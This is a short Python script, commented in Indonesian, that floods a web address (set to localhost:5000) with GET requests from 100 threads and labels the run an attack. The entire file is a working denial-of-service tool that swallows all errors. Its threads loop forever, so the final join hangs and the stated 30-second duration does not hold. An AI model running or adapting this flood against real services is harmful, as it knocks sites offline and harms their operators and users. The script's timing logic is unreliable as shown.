import requests
import threading
import time

TARGET_URL = "http://localhost:5000"
THREADS = 100  # Jumlah thread
DURATION = 30  # Durasi serangan (detik)

def attack():
    while True:
        try:
            requests.get(TARGET_URL, timeout=5)
        except:
            pass

if __name__ == '__main__':
    print(f"[+] Menyerang {TARGET_URL} dengan {THREADS} threads...")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(DURATION)
    print("[+] Serangan selesai.")
    for t in threads:
        t.join()  # Tunggu semua thread selesai
